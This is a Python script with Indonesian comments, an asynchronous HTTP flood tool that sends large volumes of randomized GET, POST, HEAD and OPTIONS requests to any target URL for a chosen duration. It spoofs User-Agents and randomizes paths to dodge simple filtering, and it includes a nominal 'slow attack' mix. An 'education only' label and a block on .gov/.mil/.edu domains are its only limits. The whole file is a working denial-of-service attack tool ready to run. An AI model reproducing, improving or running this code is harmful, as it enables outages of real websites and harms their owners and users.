```python
import asyncio
import aiohttp
import random
import string
import time
import argparse
import logging
import sys
import socket
from urllib.parse import urlparse
from tqdm import tqdm

# Atur logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Daftar User-Agent acak
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1'
]

# Daftar metode HTTP
HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS']

# Buat path URL acak
def generate_url_path(length):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

# Buat parameter query acak
def generate_query_params():
    params = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
    return f'?q={params}'

# Buat payload
def generate_payload(method, host, path, slow=False):
    headers = {
        'Host': host,
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Content-Length': str(random.randint(100, 1000)) if method == 'POST' else '0',
        'X-Custom-Header': ''.join(random.choice(string.ascii_letters) for _ in range(50))  # Header kustom besar
    }
    path = f'/{path}{generate_query_params()}'
    payload = f'{method} {path} HTTP/1.1\r\n'
    for key, value in headers.items():
        payload += f'{key}: {value}\r\n'
    if slow and method == 'POST':
        payload += '\r\n' + 'A' * 50  # Data POST parsial buat serangan lambat
    else:
        payload += '\r\n'
    return payload

# Kirim satu request
async def send_request(session, url, method, host, path, slow=False):
    try:
        async with session.request(
            method=method,
            url=url + path + generate_query_params(),
            headers={
                'Host': host,
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive'
            },
            timeout=aiohttp.ClientTimeout(total=5)
        ) as response:
            logging.info(f'Kirim request {method} ke {url}{path}, status: {response.status}')
    except Exception as e:
        logging.error(f'Gagal kirim request: {e}')

# Loop serangan utama
async def run_attack(url, host, duration, connections, slow_ratio=0.1):
    timeout = aiohttp.ClientTimeout(total=10)
    connector = aiohttp.TCPConnector(limit=connections, force_close=True)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        end_time = time.time() + duration
        tasks = []
        with tqdm(total=duration, desc="Progres Serangan", unit="s") as pbar:
            while time.time() < end_time:
                for _ in range(connections):
                    method = random.choice(HTTP_METHODS)
                    path = generate_url_path(random.randint(5, 10))
                    # Campur serangan lambat dan cepat
                    slow = random.random() < slow_ratio
                    task = asyncio.create_task(send_request(session, url, method, host, path, slow))
                    tasks.append(task)
                    if slow:
                        await asyncio.sleep(random.uniform(0.1, 0.5))  # Jeda buat serangan lambat
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                pbar.update(1)
                await asyncio.sleep(1)

# Resolve hostname ke IP
def resolve_host(host):
    try:
        ip = socket.gethostbyname(host)
        logging.info(f'Resolve {host} ke {ip}')
        return ip
    except socket.gaierror:
        logging.error(f'Gagal resolve host {host}')
        return None

# Fungsi utama
def main():
    parser = argparse.ArgumentParser(description='Alat HTTP Flood yang Ditingkatkan (Hanya untuk Edukasi)')
    parser.add_argument('--target', required=True, help='URL target (misal, http://example.com)')
    parser.add_argument('--port', type=int, default=80, help='Port target (default: 80)')
    parser.add_argument('--duration', type=int, default=60, help='Durasi serangan dalam detik')
    parser.add_argument('--connections', type=int, default=100, help='Jumlah koneksi bersamaan')
    parser.add_argument('--slow-ratio', type=float, default=0.1, help='Rasio request lambat (0 sampai 1)')

    args = parser.parse_args()

    # Validasi target
    parsed_url = urlparse(args.target)
    host = parsed_url.hostname
    if not host:
        logging.error('URL target tidak valid')
        sys.exit(1)

    # Cek domain terlarang
    restricted = ['.gov', '.mil', '.edu', '.ac']
    if any(ext in host for ext in restricted):
        logging.error(f'Tidak bisa nyerang domain terlarang: {restricted}')
        sys.exit(1)

    # Resolve IP
    ip = resolve_host(host)
    if not ip:
        sys.exit(1)

    # Atur protokol
    protocol = 'https' if args.port == 443 else 'http'
    url = f'{protocol}://{host}:{args.port}'

    # Jalankan serangan
    logging.info(f'Mulai serangan ke {url} selama {args.duration} detik dengan {args.connections} koneksi')
    try:
        asyncio.run(run_attack(url, host, args.duration, args.connections, args.slow_ratio))
        logging.info('Serangan selesai')
    except KeyboardInterrupt:
        logging.info('Serangan dihentikan oleh pengguna')
        sys.exit(0)

if __name__ == '__main__':
    main()
```
